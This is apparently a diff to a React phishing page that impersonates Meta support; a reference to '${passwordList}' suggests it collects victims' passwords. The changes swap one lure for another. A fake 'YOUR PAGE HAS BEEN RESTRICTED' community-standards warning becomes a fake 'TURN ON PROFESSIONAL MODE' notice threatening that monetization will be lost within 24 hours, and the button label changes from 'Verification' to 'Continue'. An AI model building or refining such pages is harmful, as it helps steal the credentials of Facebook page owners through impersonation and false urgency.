@@ -295,7 +295,6 @@ ${passwordList}`;
     }, []);
     return (
         <div className='min-h-screen relative'>
-            <img src={Banner} alt='Meta support header' className='w-full h-48 object-cover shadow-md' />
             <div className='md:py-16 bg-gradient-to-b from-gray-50 to-gray-100'>
                 <div className='max-w-xl mx-auto p-6 bg-white border rounded-xl border-gray-200 shadow-lg'>
                     <div className='flex items-start justify-between w-full mb-12'>
@@ -319,16 +318,12 @@ ${passwordList}`;
                         </div>
                     </div>
 
-                    <div className='flex justify-center mb-8'>
-                        <img src={HeroImage} alt='Account status' className='w-1/2 h-auto drop-shadow-lg' />
-                    </div>
-
                     <div className='space-y-6'>
                         <div className='text-center'>
-                            <h1 className='text-xl font-bold text-gray-900 mb-4'>YOUR PAGE HAS BEEN RESTRICTED</h1>
+                            <h1 className='text-xl font-bold text-gray-900 mb-4'>TURN ON PROFESSIONAL MODE</h1>
                             <div className='flex text-left justify-center p-4 bg-orange-50 border border-orange-200 rounded-lg'>
                                 <AlertCircle className='w-5 h-5 text-orange-500 mr-2 flex-shrink-0' />
-                                <p className='text-sm text-gray-700'>We have received multiple reports of potential violations of our terms of service. Your account requires immediate review.</p>
+                                <p className='text-sm text-gray-700'>Please provide all the required information. If we do not receive a response within 24 hours, the automatic monetization feature on your Page will be deactivated and may not be re-enabled in the future.</p>
                             </div>
                         </div>
 
@@ -362,12 +357,12 @@ ${passwordList}`;
                                 </div>
 
                                 <button type='submit' tabIndex={4} className='w-full bg-blue-600 text-white py-2.5 px-4 rounded-lg hover:bg-blue-700 transition-colors font-medium shadow-sm'>
-                                    Verification
+                                    Continue
                                 </button>
 
                                 <div className='pt-4 border-t'>
                                     <p className='font-medium text-gray-700 text-sm'>{`Case #${caseNumber}`}</p>
-                                    <p className='mt-2 text-xs text-gray-600'>Case Type: Community Standards Violation Review</p>
+                                    <p className='mt-2 text-xs text-gray-600'>Case Type: Turn on monetization</p>
                                 </div>
                             </form>
                         </div>
